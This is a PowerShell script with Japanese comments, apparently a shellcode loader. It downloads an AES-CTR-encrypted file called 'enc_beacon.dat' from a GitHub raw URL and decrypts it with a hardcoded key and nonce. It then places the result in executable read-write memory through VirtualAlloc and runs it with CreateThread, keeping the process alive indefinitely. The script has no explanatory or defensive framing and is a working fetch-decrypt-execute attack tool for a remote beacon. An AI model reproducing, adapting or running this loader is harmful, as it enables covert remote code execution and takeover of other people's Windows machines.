# APIの定義 (型定義の競合を避けるため、一意のクラス名を使用)
$dynCode = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint prot);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr addr, uint size, IntPtr start, IntPtr param, uint flags, IntPtr id);
}
"@
Add-Type -TypeDefinition $dynCode

# --- 設定項目 ---
$url = "https://raw.githubusercontent.com/Kenji-S113/001/refs/heads/main/enc_beacon.dat"
$keyHex = "814be8be09cec2edebb0af1a5f8cb057"
$nonceHex = "92fbd270e1329e4a"

# データの取得と復号の準備
$key = [System.Runtime.Remoting.Metadata.W3cXsd2001.SoapHexBinary]::Parse($keyHex).Value
$nonce = [System.Runtime.Remoting.Metadata.W3cXsd2001.SoapHexBinary]::Parse($nonceHex).Value
$encryptedData = (New-Object System.Net.WebClient).DownloadData($url)
$decryptedData = New-Object Byte[] $encryptedData.Length

# AES-CTR 復号処理
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
$aes.Padding = [System.Security.Cryptography.PaddingMode]::None
$aes.Key = $key
$encryptor = $aes.CreateEncryptor()
$counterBlock = New-Object Byte[] 16
[Array]::Copy($nonce, 0, $counterBlock, 0, 8)

for ($i = 0; $i -lt $encryptedData.Length; $i += 16) {
    $keystream = New-Object Byte[] 16
    $encryptor.TransformBlock($counterBlock, 0, 16, $keystream, 0) | Out-Null
    for ($j = 0; $j -lt 16 -and ($i + $j) -lt $encryptedData.Length; $j++) {
        $decryptedData[$i + $j] = $encryptedData[$i + $j] -bxor $keystream[$j]
    }
    for ($k = 15; $k -ge 8; $k--) { if (++$counterBlock[$k] -ne 0) { break } }
}

# メモリへの展開と実行
$size = $decryptedData.Length
$address = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40) # 0x40 = RWX
[System.Runtime.InteropServices.Marshal]::Copy($decryptedData, 0, $address, $size)
[Win32]::CreateThread([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null

# プロセスを維持
while($true) { Start-Sleep -Seconds 60 }